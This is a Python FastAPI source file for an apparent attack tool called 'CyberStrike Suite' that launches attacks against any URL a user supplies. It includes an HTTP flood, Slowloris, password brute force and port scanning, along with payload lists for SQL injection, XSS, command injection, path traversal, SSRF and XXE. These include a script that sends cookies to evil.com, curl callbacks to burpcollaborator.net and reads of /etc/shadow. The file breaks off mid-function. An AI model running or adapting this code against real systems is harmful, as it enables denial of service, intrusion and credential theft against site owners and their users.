import asyncio
import aiohttp
import random
import time
import hashlib
import string
import os
import re
import json
import uuid
import socket
import ssl
import dns.resolver
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from datetime import datetime
from fastapi import FastAPI, BackgroundTasks, HTTPException, WebSocket, WebSocketDisconnect, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
import uvicorn

app = FastAPI(title="CyberStrike Suite", version="1.0.0")

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Create static directory
os.makedirs("static", exist_ok=True)

# Serve static files
app.mount("/static", StaticFiles(directory="static"), name="static")

class AttackRequest(BaseModel):
    url: str
    attack_type: str
    duration: int = 30
    intensity: int = 5
    threads: int = 10
    target_port: Optional[int] = None
    username: Optional[str] = None
    wordlist: Optional[str] = None
    custom_header_payload: Optional[str] = None
    custom_xss_payload: Optional[str] = None

class AttackResponse(BaseModel):
    success: bool
    message: str
    attack_id: Optional[str] = None

# Global metrics & synchronization lock
MAX_TIME_SAMPLES = 1000
MAX_VULN_ENTRIES = 500

class SecureMetrics(dict):
    def __init__(self) -> None:
        super().__init__()
        self.lock = asyncio.Lock()
        self["total_requests"] = 0
        self["successful_requests"] = 0
        self["failed_requests"] = 0
        self["start_time"] = None
        self["attacks_running"] = False
        self["current_attacks"] = []
        self["response_times"] = []
        self["request_history"] = []
        self["vulnerabilities_found"] = []
        self["attack_history"] = []
        self["system_status"] = "ready"

metrics = SecureMetrics()
metrics_lock = metrics.lock

async def record_request_metric(success: bool, req_time: Optional[float] = None, status_code: Optional[int] = None):
    async with metrics.lock:
        metrics["total_requests"] += 1
        if success:
            metrics["successful_requests"] += 1
        else:
            metrics["failed_requests"] += 1
        if req_time is not None:
            metrics["response_times"].append(req_time)
            if len(metrics["response_times"]) > MAX_TIME_SAMPLES:
                del metrics["response_times"][:-MAX_TIME_SAMPLES]
        if status_code is not None and req_time is not None:
            metrics["request_history"].append({"time": time.time(), "status": status_code, "response_time": req_time})
            if len(metrics["request_history"]) > MAX_TIME_SAMPLES:
                del metrics["request_history"][:-MAX_TIME_SAMPLES]

async def record_vulnerability(vuln: Dict[str, Any]) -> bool:
    async with metrics.lock:
        dedup_key = (vuln.get("type"), vuln.get("url"), vuln.get("payload"))
        for existing in metrics["vulnerabilities_found"]:
            if (existing.get("type"), existing.get("url"), existing.get("payload")) == dedup_key:
                return False
        metrics["vulnerabilities_found"].append(vuln)
        if len(metrics["vulnerabilities_found"]) > MAX_VULN_ENTRIES:
            del metrics["vulnerabilities_found"][:-MAX_VULN_ENTRIES]
        return True

# ── Hardcoded self-test target ─────────────────────────────────────────


# WebSocket connection manager
class ConnectionManager:
    def __init__(self) -> None:
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        if websocket in self.active_connections:
            try:
                self.active_connections.remove(websocket)
            except ValueError:
                pass

    async def send_personal_message(self, message: str, websocket: WebSocket) -> None:
        try:
            await websocket.send_text(message)
        except Exception:
            self.disconnect(websocket)

    async def broadcast(self, message: str) -> None:
        dead = []
        for connection in list(self.active_connections):
            try:
                await connection.send_text(message)
            except (BrokenPipeError, Exception):
                dead.append(connection)
        for d in dead:
            self.disconnect(d)

    async def broadcast_json(self, data_type: str, payload_data: Optional[Dict[str, Any]] = None) -> None:
        msg_payload: Dict[str, Any] = {"type": data_type}
        if payload_data is not None:
            msg_payload["data"] = payload_data
        await self.broadcast(json.dumps(msg_payload))

manager = ConnectionManager()

# Attack functions
async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    timeout_cfg = aiohttp.ClientTimeout(total=2.5, sock_connect=1.5, sock_read=2.0)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        start_time = time.time()
        tasks = []
        
        async def send_request():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    headers = {
                        "User-Agent": random.choice([
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                        ])
                    }
                    
                    req_start = time.time()
                    async with session.get(url, headers=headers) as response:
                        req_time = time.time() - req_start
                        await record_request_metric(True, req_time, response.status)
                        
                        await manager.broadcast(json.dumps({
                            "type": "metrics",
                            "data": {
                                "total_requests": metrics["total_requests"],
                                "successful_requests": metrics["successful_requests"],
                                "failed_requests": metrics["failed_requests"],
                                "response_time": req_time,
                                "current_attack": "DDoS",
                                "attack_id": attack_id
                            }
                        }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        jitter = random.uniform(0.0, min(0.005, sleep_delay * 0.1))
                        await asyncio.sleep(sleep_delay + jitter)
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.02 + random.uniform(0.005, 0.03))
        
        for _ in range(threads):
            task = asyncio.create_task(send_request())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def sql_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1#",
        "admin'--",
        "' OR 'x'='x",
        "1' OR '1'='1' /*",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--"
    ]
    sql_error_signatures = [
        "sql syntax", "mysql_fetch", "ora-0", "microsoft odbc",
        "sqlite3.operationalerror", "unclosed quotation mark",
        "unterminated quoted string", "pg_query()", "syntax error at or near"
    ]
    data_leak_signatures = [
        "information_schema", "admin@testme.local", "password_hash",
        "sqlite_master", "union select"
    ]
    
    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        start_time = time.time()
        base = url.rstrip('/')
        baseline_text = ""
        baseline_len = 0
        try:
            async with session.get(f"{base}/api/products?id=1") as base_resp:
                baseline_text = (await base_resp.text()).lower()
                baseline_len = len(baseline_text)
        except Exception:
            pass

        tasks = []
        
        async def send_payload():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    payload = random.choice(payloads)
                    test_url = f"{base}/api/products?id={payload}"
                    
                    req_start = time.time()
                    async with session.get(test_url) as response:
                        req_time = time.time() - req_start
                        text = await response.text()
                        text_lower = text.lower()
                        await record_request_metric(True, req_time, response.status)
                        
                        matched_err = next((err for err in sql_error_signatures if err in text_lower and err not in baseline_text), None)
                        matched_leak = next((lk for lk in data_leak_signatures if lk in text_lower and lk not in baseline_text), None)
                        boolean_bypass = (
                            response.status == 200
                            and ("1=1" in payload or "'1'='1" in payload)
                            and baseline_len > 0
                            and len(text_lower) > baseline_len * 1.35
                        )
                        
                        if matched_err or matched_leak or boolean_bypass:
                            evidence = matched_err or matched_leak or f"Response size expanded ({len(text_lower)}B vs {baseline_len}B baseline)"
                            vuln = {
                                "type": "SQL Injection",
                                "url": test_url,
                                "payload": payload,
                                "evidence": evidence,
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            }
                            if await record_vulnerability(vuln):
                                await manager.broadcast(json.dumps({
                                    "type": "vulnerability",
                                    "data": vuln
                                }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
        
        for _ in range(threads):
            task = asyncio.create_task(send_payload())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

def _is_unescaped_xss_reflected(payload: str, body: str, content_type: str) -> bool:
    """Verify the XSS payload is reflected unescaped in an executable HTML/DOM context."""
    ctype = (content_type or "").lower()
    if "application/json" in ctype or "text/plain" in ctype:
        return False
    if payload not in body:
        return False
    # Ensure angle brackets or event handlers are present unescaped (not HTML entity encoded)
    active_Execution_tokens = ("<script", "onerror=", "onload=", "onfocus=", "<svg", "<iframe", "<img", "javascript:")
    return any(tok in payload.lower() and tok in body.lower() for tok in active_Execution_tokens)

async def xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: Optional[str] = None):
    payloads = [
        "<img src=x onerror=alert(1)>",
        "<script>alert('XSS')</script>",
        "<body onload=alert(1)>",
        "';alert(1);//",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "javascript:alert(1)",
        "<script>document.location='http://evil.com/?'+document.cookie</script>"
    ]
    if custom_xss_payload:
        p = custom_xss_payload
        if '<' not in p and '>' not in p:
            payloads.append(f"<script>alert('{p}')</script>")
        else:
            payloads.append(p)
            
    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        start_time = time.time()
        tasks = []
        
        async def send_payload():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    payload = random.choice(payloads)
                    base = url.rstrip('/')
                    test_url = f"{base}/search?q={payload}"
                    
                    req_start = time.time()
                    async with session.get(test_url) as response:
                        req_time = time.time() - req_start
                        text = await response.text()
                        content_type = response.headers.get("Content-Type", "text/html")
                        await record_request_metric(True, req_time, response.status)
                        
                        if _is_unescaped_xss_reflected(payload, text, content_type):
                            vuln = {
                                "type": "XSS",
                                "url": test_url,
                                "payload": payload,
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            }
                            if await record_vulnerability(vuln):
                                await manager.broadcast(json.dumps({
                                    "type": "vulnerability",
                                    "data": vuln
                                }))
                        
                        sleep_delay = 1.0 / max(intensity, 1)
                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                except Exception:
                    await record_request_metric(False)
                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
        
        for _ in range(threads):
            task = asyncio.create_task(send_payload())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def stored_xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: str = None):
    # Unique marker to avoid false positives
    unique_marker = f"cstrike_stored_{int(time.time())}"
    payload = custom_xss_payload if custom_xss_payload else f"<script>alert('{unique_marker}')</script>"
    
    # We assume there's an api/comments endpoint for testing (could be expanded)
    post_url = f"{url}/api/comments" if not url.endswith("/") else f"{url}api/comments"
    get_url = f"{url}/api/comments" if not url.endswith("/") else f"{url}api/comments"

    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        
        while time.time() - start_time < duration and metrics["attacks_running"]:
            try:
                req_start = time.time()
                
                # Step 1: Inject Payload
                await session.post(
                    post_url, 
                    json={"comment": payload},
                    timeout=aiohttp.ClientTimeout(total=5)
                )
                metrics["total_requests"] += 1
                
                # Step 2: Verify Persistence
                async with session.get(get_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    req_time = time.time() - req_start
                    metrics["total_requests"] += 1
                    metrics["successful_requests"] += 2
                    
                    text = await response.text()
                    
                    # If the payload came back from the GET request, it was stored!
                    if payload in text:
                        vuln = {
                            "type": "Stored XSS",
                            "url": get_url,
                            "payload": payload,
                            "timestamp": datetime.now().isoformat(),
                            "attack_id": attack_id
                        }
                        metrics["vulnerabilities_found"].append(vuln)
                        await manager.broadcast(json.dumps({
                            "type": "vulnerability",
                            "data": vuln
                        }))
                        
                        # Stop the attack once confirmed to avoid spamming the DB
                        break
                        
                    metrics["response_times"].append(req_time)
                    await asyncio.sleep(1.0 / intensity)
            except Exception:
                metrics["failed_requests"] += 1
                await asyncio.sleep(0.5)

async def csrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        tasks = []
        
        async def send_request():
            while time.time() - start_time < duration and metrics["attacks_running"]:
                try:
                    base = url.rstrip('/')
                    test_url = f"{base}/api/update-profile"
                    
                    # CSRF: POST without token
                    data = {"action": "update", "role": "admin", "email": "attacker@evil.com"}
                    req_start = time.time()
                    async with session.post(test_url, data=data, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        req_time = time.time() - req_start
                        metrics["total_requests"] += 1
                        metrics["successful_requests"] += 1
                        if True:
                            # If CSRF state action completes without 403/401 blocks, log potentially vulnerable
                            if response.status == 200:
                                vuln = {
                                    "type": "Missing CSRF Protection",
                                    "url": test_url,
                                    "payload": "Simulated Cross-Site POST request (No Token)",
                                    "timestamp": datetime.now().isoformat(),
                                    "attack_id": attack_id
                                }
                                metrics["vulnerabilities_found"].append(vuln)
                                await manager.broadcast(json.dumps({
                                    "type": "vulnerability",
                                    "data": vuln
                                }))
                        
                        
                        metrics["response_times"].append(req_time)
                        await asyncio.sleep(1.0 / intensity)
                except Exception:
                    metrics["failed_requests"] += 1
                    await asyncio.sleep(0.5)
        
        for _ in range(threads):
            task = asyncio.create_task(send_request())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def brute_force_attack(url: str, duration: int, intensity: int, threads: int, username: str, wordlist_file: Optional[str], attack_id: str):
    # Simulated wordlist or load from configuration
    passwords = ["123456", "password", "admin", "12345", "12345678", "qwerty", "secret", "guest", "root", "oracle"]
    if wordlist_file and os.path.exists(wordlist_file):
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()][:100]
        except Exception:
            pass

    async with aiohttp.ClientSession() as session:
        start_time = time.time()
        tasks = []
        
        async def try_login():
            p_idx = 0
            while time.time() - start_time < duration and metrics["attacks_running"] and p_idx < len(passwords):
                try:
                    password = passwords[p_idx]
                    p_idx += 1
                    
                    login_data = {
                        "username": username or "admin",
                        "password": password
                    }
                    
                    # Try post requests to login endpoint
                    base = url.rstrip('/')
                    test_url = f"{base}/login" if '/login' not in url else url
                    async with session.post(test_url, data=f"username={login_data['username']}&password={password}",
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=aiohttp.ClientTimeout(total=3)) as response:
                        req_time = time.time() - req_start
                        metrics["total_requests"] += 1
                        
                        metrics["successful_requests"] += 1
                        if True:
                            if response.status == 200:
                                # Check if login succeeded (simulated based on status)
                                text = await response.text()
                                if "token" in text.lower() or "success" in text.lower() or "dashboard" in text.lower():
                                    vuln = {
                                        "type": "Weak Credentials",
                                        "url": test_url,
                                        "payload": f"User: {login_data['username']} | Pass: {password}",
                                        "timestamp": datetime.now().isoformat(),
                                        "attack_id": attack_id
                                    }
                                    metrics["vulnerabilities_found"].append(vuln)
                                    await manager.broadcast(json.dumps({
                                        "type": "vulnerability",
                                        "data": vuln
                                    }))
                        
                            
                        metrics["response_times"].append(req_time)
                        await asyncio.sleep(1.0 / intensity)
                except Exception:
                    metrics["failed_requests"] += 1
                    await asyncio.sleep(0.5)
        
        for _ in range(threads):
            task = asyncio.create_task(try_login())
            tasks.append(task)
        
        await asyncio.gather(*tasks)

async def port_scan_attack(url: str, duration: int, intensity: int, target_port: Optional[int], attack_id: str):
    # Extract host
    host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 8000, 8080, 8443, 9000]
    if target_port:
        ports = [target_port]
        
    start_time = time.time()
    
    async def scan_port(port):
        if not metrics["attacks_running"]:
            return
        try:
            metrics["total_requests"] += 1
            req_start = time.time()
            
            # Use socket to check open port
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.settimeout(1.5)
            result = conn.connect_ex((host, port))
            req_time = time.time() - req_start
            metrics["response_times"].append(req_time)
            
            if result == 0:
                metrics["successful_requests"] += 1
                vuln = {
                    "type": "Open Port Found",
                    "url": f"{host}:{port}",
                    "payload": f"Port {port} status: OPEN",
                    "timestamp": datetime.now().isoformat(),
                    "attack_id": attack_id
                }
                metrics["vulnerabilities_found"].append(vuln)
                await manager.broadcast(json.dumps({
                    "type": "vulnerability",
                    "data": vuln
                }))
            
            conn.close()
            
            await manager.broadcast(json.dumps({
                "type": "metrics",
                "data": {
                    "total_requests": metrics["total_requests"],
                    "successful_requests": metrics["successful_requests"],
                    "failed_requests": metrics["failed_requests"],
                    "response_time": req_time,
                    "current_attack": "Port Scan",
                    "attack_id": attack_id
                }
            }))
        except Exception:
            metrics["failed_requests"] += 1

    # Scan sequentially or throttled based on intensity
    for port in ports:
        if time.time() - start_time >= duration or not metrics["attacks_running"]:
            break
        await scan_port(port)
        await asyncio.sleep(0.5 / intensity)

# ── New Attack Functions ─────────────────────────────────────────────

async def slowloris_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Slowloris — opens many partial HTTP connections and keeps them alive."""
    import socket as _sock
    start_time = time.time()
    host = re.sub(r'^https?://', '', url.strip()).split('/')[0].split(':')[0]
    port = 443 if url.startswith('https') else 80
    sockets = []
    while time.time() - start_time < duration and metrics['attacks_running']:
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f'GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n'.encode())
            sockets.append(s)
            metrics['total_requests'] += 1
            metrics['successful_requests'] += 1
            metrics['request_history'].append({'time': time.time(), 'status': 'open', 'response_time': 0})
            await manager.broadcast(json.dumps({'type':'log','message':f'[Slowloris] Socket #{len(sockets)} open to {host}:{port}','level':'warning'}))
        except Exception:
            metrics['failed_requests'] += 1
        # Keep sockets alive by sending partial headers
        for s in list(sockets):
            try:
                s.send(f'X-Header: {random.randint(0,999999)}\r\n'.encode())
            except Exception:
                sockets.remove(s)
        await asyncio.sleep(1.0 / max(intensity, 1))
    for s in sockets:
        try: s.close()
        except: pass


async def traversal_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
        '../../../../etc/shadow', '../etc/passwd%00',
        '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd', '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '../../../../proc/self/environ'
    ]
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(payloads)
            base = url.rstrip('/')
            test_url = f"{base}/api/file?path={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    metrics['total_requests'] += 1
                    if 'root:' in body or '[fonts]' in body or 'localhost' in body:
                        metrics['successful_requests'] += 1
                        vuln = {'type': 'Directory Traversal', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
                        metrics['vulnerabilities_found'].append(vuln)
                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
            except Exception as e:
                metrics['failed_requests'] += 1
            await asyncio.sleep(1.0 / max(intensity, 1))


async def cmd_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        '; id', '| id', '& id', '`id`', '$(id)',
        '; cat /etc/passwd', '| whoami', '& whoami',
        '; ls -la', '| dir', '& dir',
        '; ping -c 1 127.0.0.1', '| ping -n 1 127.0.0.1',
        '$(curl http://burpcollaborator.net)', '`curl http://burpcollaborator.net`'
    ]
    params = ['cmd', 'exec', 'command', 'run', 'query', 'ping', 'ip', 'host', 'addr']
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(payloads)
            base = url.rstrip('/')
            test_url = f"{base}/api/ping?host=127.0.0.1{payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    metrics['total_requests'] += 1
                    indicators = ['uid=', 'root', 'Administrator', 'PING', 'Directory of']
                    if any(ind in body for ind in indicators):
                        metrics['successful_requests'] += 1
                        vuln = {'type': 'Command Injection', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
                        metrics['vulnerabilities_found'].append(vuln)
                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
            except Exception:
                metrics['failed_requests'] += 1
            await asyncio.sleep(1.0 / max(intensity, 1))


async def ssrf_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    payloads = [
        'http://127.0.0.1/', 'http://localhost/', 'http://0.0.0.0/',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        'http://metadata.google.internal/',            # GCP metadata
        'http://169.254.169.254/metadata/v1/',         # DigitalOcean
        'http://127.0.0.1:22/', 'http://127.0.0.1:3306/',
        'http://127.0.0.1:6379/', 'http://127.0.0.1:5432/',
        'file:///etc/passwd', 'file:///C:/Windows/win.ini',
        'dict://127.0.0.1:6379/info', 'gopher://127.0.0.1:25/_'
    ]
    params = ['url', 'redirect', 'callback', 'fetch', 'src', 'href', 'uri', 'endpoint', 'proxy', 'load']
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(payloads)
            base = url.rstrip('/')
            test_url = f"{base}/api/fetch?url={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    metrics['total_requests'] += 1
                    ssrf_indicators = ['ami-id', 'instance-id', 'local-ipv4', 'security-credentials',
                                       'computeMetadata', 'root:', 'SSH-2.0', 'redis_version']
                    metrics['successful_requests'] += 1
                    if any(ind in body for ind in ssrf_indicators):
                        vuln = {'type': 'SSRF', 'url': test_url, 'payload': payload, 'severity': 'Critical', 'evidence': body[:120]}
                        metrics['vulnerabilities_found'].append(vuln)
                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
            except Exception:
                metrics['failed_requests'] += 1
            await asyncio.sleep(1.0 / max(intensity, 1))


async def xxe_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    ]
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(xxe_payloads)
            t0 = time.time()
            base = url.rstrip('/')
            try:
                async with session.post(f"{base}/api/xml", data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t0
                    metrics['total_requests'] += 1
                    if 'root:' in body or '[fonts]' in body or 'localhost' in body:
                        metrics['successful_requests'] += 1
                        vuln = {'type': 'XXE Injection', 'url': url, 'payload': payload[:80], 'severity': 'Critical', 'evidence': body[:120]}
                        metrics['vulnerabilities_found'].append(vuln)
                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                        await manager.broadcast(json.dumps({'type':'log','message':f'[XXE] VULNERABLE — file disclosure detected','level':'error'}))
                    
                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
            except Exception:
                metrics['failed_requests'] += 1
            await asyncio.sleep(1.0 / max(intensity, 1))


async def idor_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Increment numeric IDs in query params to test for IDOR."""
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        for base_id in range(1, 200):
            if time.time() - start_time >= duration or not metrics['attacks_running']:
                break
            # Use honeypot's dedicated /api/users/<id> IDOR endpoint
            base_url_idor = url.rstrip('/')
            test_url = f"{base_url_idor}/api/users/{base_id}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    if resp.status == 200:
                        await record_request_metric(True, elapsed, resp.status)
                        await manager.broadcast(json.dumps({'type':'log','message':f'[IDOR] 200 OK → /api/users/{base_id} — check manually for data leak','level':'warning'}))
                    elif resp.status in [401, 403]:
                        await record_request_metric(False, elapsed, resp.status)
                    else:
                        await record_request_metric(True, elapsed, resp.status)
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def open_redirect_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    redirect_payloads = [
        '//evil.com', '//evil.com/phish', 'https://evil.com',
        '//evil.com%2F@trusted.com', '/\\evil.com', '/%2F%2Fevil.com',
        'https:evil.com', '//evil%E3%80%82com', '//google.com',
        '///evil.com', '/redirect?url=https://evil.com'
    ]
    params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'goto', 'dest', 'destination', 'ref', 'r', 'continue', 'forward']
    start_time = time.time()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(redirect_payloads)
            base = url.rstrip('/')
            test_url = f"{base}/redirect?url={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    await record_request_metric(True, elapsed, resp.status)
                    location = resp.headers.get('Location', '')
                    if resp.status in [301,302,303,307,308] and 'evil.com' in location:
                        vuln = {'type': 'Open Redirect', 'url': test_url, 'payload': payload, 'severity': 'Medium', 'evidence': f'Location: {location}'}
                        if await record_vulnerability(vuln):
                            await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                            await manager.broadcast(json.dumps({'type':'log','message':f'[Redirect] VULNERABLE → redirects to {location}','level':'error'}))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def header_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_payload: Optional[str] = None):
    import urllib.parse
    crlf_payloads = [
        '%0d%0aSet-Cookie:%20injected=value',
        '%0d%0aLocation:%20https://evil.com',
        '%0aX-Injected:%20header',
        '%0d%0aSet-Cookie:%20session=hacked',
        '%0d%0aX-Forwarded-For:%20127.0.0.1',
        '%0d%0aContent-Length:%200',
    ]
    custom_tokens: List[str] = []
    if custom_payload:
        clean_custom = custom_payload.replace('\r\n', '\n').replace('\r', '\n')
        custom_encoded_list = []
        for line in clean_custom.split('\n'):
            stripped = line.strip()
            if stripped:
                custom_tokens.append(stripped.lower())
                custom_encoded_list.append('%0d%0a' + urllib.parse.quote(stripped, safe=':=;-_/.'))
        if custom_encoded_list:
            crlf_payloads = custom_encoded_list + crlf_payloads

    start_time = time.time()
    idx = 0
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = crlf_payloads[idx % len(crlf_payloads)]
            idx += 1
            base = url.rstrip('/')
            test_url = f"{base}/api/set-lang?lang=en{payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    await record_request_metric(True, elapsed, resp.status)
                    resp_headers_str = str(dict(resp.headers))
                    resp_headers_lower = resp_headers_str.lower()
                    matched_custom = any(tok in resp_headers_lower for tok in custom_tokens)
                    if 'injected' in resp_headers_lower or 'hacked' in resp_headers_lower or matched_custom:
                        decoded_payload = urllib.parse.unquote(payload).replace('\r\n', '\\r\\n').replace('\n', '\\n')
                        vuln = {
                            'type': 'HTTP Header Injection / CRLF',
                            'url': test_url,
                            'payload': decoded_payload,
                            'severity': 'High',
                            'evidence': resp_headers_str[:240],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        }
                        if await record_vulnerability(vuln):
                            await manager.broadcast(json.dumps({'type': 'vulnerability', 'data': vuln}))
                            await manager.broadcast(json.dumps({'type': 'log', 'message': f'[Header Injection] Reflected in response headers: {decoded_payload}', 'level': 'warning'}))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


# ══════════════════════════════════════════════════════════════════════
#  REAL TARGET AUDIT  — runs before every attack, reports real findings
# ══════════════════════════════════════════════════════════════════════

async def _broadcast_finding(vuln: dict):
    """Store finding and broadcast to all connected clients."""
    if await record_vulnerability(vuln):
        await manager.broadcast(json.dumps({"type": "vulnerability", "data": vuln}))


def format_url(target: str) -> str:
    if target.startswith("http"):
        return target
    if "localhost" in target or "127.0.0.1" in target or re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target):
        return f"http://{target}"
